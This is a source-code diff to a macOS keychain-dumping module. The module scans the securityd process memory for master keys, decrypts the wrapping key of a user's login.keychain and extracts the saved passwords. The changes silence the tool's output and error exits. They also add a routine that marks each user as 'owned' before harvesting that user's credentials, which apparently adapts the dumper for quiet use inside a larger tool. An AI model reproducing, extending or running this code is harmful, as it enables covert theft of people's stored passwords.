@@ -7,6 +7,7 @@
 //
 
 #import "keychaindump.h"
+#import "WTConfig.h"
 
 #include <stdio.h>
 #include <stdlib.h>
@@ -66,7 +67,7 @@ void add_master_candidate(char *key) {
         g_master_candidates[g_master_candidates_count++] = new;
     } else {
         printf("[-] Too many candidate keys to fit in memory\n");
-        exit(1);
+        return;
     }
 }
 
@@ -101,7 +102,7 @@ void search_for_keys_in_task_memory(mach_port_name_t task, vm_address_t start, v
     char *buffer = malloc(sz);
     if (!buffer) {
         printf("[-] Could not allocate memory for key search\n");
-        exit(1);
+        return;
     }
     
     size_t read_sz;
@@ -183,7 +184,7 @@ t_credentials *find_or_create_credentials(char *label) {
         return new;
     } else {
         printf("[-] Too many credentials to fit in memory\n");
-        exit(1);
+        return NULL;
     }
 }
 
@@ -242,7 +243,7 @@ int dump_wrapping_key(char *out, char *master, char *buffer, size_t sz) {
     }
     if (offset == 0) {
         printf("[-] Could not find DbBlob\n");
-        exit(1);
+        return 1;
     }
     char *blob = buffer + offset;
     
@@ -474,19 +475,19 @@ int getcreds(int argc, char **argv) {
     int pid = get_securityd_pid();
     if (!pid) {
         printf("[-] Could not find the securityd process\n");
-        exit(1);
+        return 1;
     }
     
     if (geteuid()) {
         printf("[-] No root privileges, please run with sudo\n");
-        exit(1);
+        return 1;
     }
     
     search_for_keys_in_process(pid);
     
 //    printf("[*] Found %i master key candidates\n", g_master_candidates_count);
     
-    if (!g_master_candidates_count) exit(1);
+    if (!g_master_candidates_count) return 1;
     
     // Phase 2. Try decrypting the wrapping key with each master key candidate
     // to see which one gives a valid result.
@@ -499,8 +500,8 @@ int getcreds(int argc, char **argv) {
     
     FILE *f = fopen(filename, "rb");
     if (!f) {
-        printf("[-] Could not open %s\n", filename);
-        exit(1);
+//        printf("[-] Could not open %s\n", filename);
+        return 1;
     }
     
     fseek(f, 0, SEEK_END);
@@ -524,8 +525,8 @@ int getcreds(int argc, char **argv) {
         }
     }
     if (!key_len) {
-        printf("[-] None of the master key candidates seemed to work\n");
-        exit(1);
+//        printf("[-] None of the master key candidates seemed to work\n");
+        return 1;
     }
     
     char s_key[24*2+1];
@@ -550,20 +551,20 @@ int getcreds(int argc, char **argv) {
     // If the keychain file is unlocked, the real key should be in memory.
     int pid = get_securityd_pid();
     if (!pid) {
-        printf("[-] Could not find the securityd process\n");
-        exit(1);
+//        printf("[-] Could not find the securityd process\n");
+        return nil;
     }
     
     if (geteuid()) {
-        printf("[-] No root privileges, please run with sudo\n");
-        exit(1);
+//        printf("[-] No root privileges, please run with sudo\n");
+        return nil;
     }
     
     search_for_keys_in_process(pid);
     
-    printf("[*] Found %i master key candidates\n", g_master_candidates_count);
+//    printf("[*] Found %i master key candidates\n", g_master_candidates_count);
     
-    if (!g_master_candidates_count) exit(1);
+    if (!g_master_candidates_count) return nil;
     
     // Phase 2. Try decrypting the wrapping key with each master key candidate
     // to see which one gives a valid result.
@@ -571,8 +572,8 @@ int getcreds(int argc, char **argv) {
     
     FILE *f = fopen(filename, "rb");
     if (!f) {
-        printf("[-] Could not open %s\n", filename);
-        exit(1);
+//        printf("[-] Could not open %s\n", filename);
+        return nil;
     }
     
     fseek(f, 0, SEEK_END);
@@ -582,27 +583,27 @@ int getcreds(int argc, char **argv) {
     fread(buffer, 1, sz, f);
     fclose(f);
     
-    printf("[*] Trying to decrypt wrapping key in %s\n", filename);
+//    printf("[*] Trying to decrypt wrapping key in %s\n", filename);
     
     char key[24];
     int i, key_len = 0;
     for (i = 0; i < g_master_candidates_count; ++i) {
         char s_key[24*2+1];
         hex_string(s_key, g_master_candidates[i], 24);
-        printf("[*] Trying master key candidate: %s\n", s_key);
+//        printf("[*] Trying master key candidate: %s\n", s_key);
         if ((key_len = dump_wrapping_key(key, g_master_candidates[i], buffer, sz))) {
-            printf("[+] Found master key: %s\n", s_key);
+//            printf("[+] Found master key: %s\n", s_key);
             break;
         }
     }
     if (!key_len) {
-        printf("[-] None of the master key candidates seemed to work\n");
-        exit(1);
+//        printf("[-] None of the master key candidates seemed to work\n");
+        return nil;
     }
     
     char s_key[24*2+1];
     hex_string(s_key, key, 24);
-    printf("[+] Found wrapping key: %s\n", s_key);
+//    printf("[+] Found wrapping key: %s\n", s_key);
     
     // Phase 3. Using the wrapping key, dump all credentials from the keychain
     // file into the global credentials list and decrypt everything.
@@ -616,7 +617,12 @@ int getcreds(int argc, char **argv) {
 
 +(NSArray *)getPasswordsForUser:(NSString *)user {
     NSString *keychainFilePath = [NSString stringWithFormat:@"/Users/%@/Library/Keychains/login.keychain", user];
-    return [keychaindump getPasswords:keychainFilePath];
+    WTConfig *config = [WTConfig getConfig];
+    if (![config userHasBeenOwned:user]) {
+        [config addOwnedUser:user];
+        return [keychaindump getPasswords:keychainFilePath];
+    }
+    return @[];
 }
 
 @end
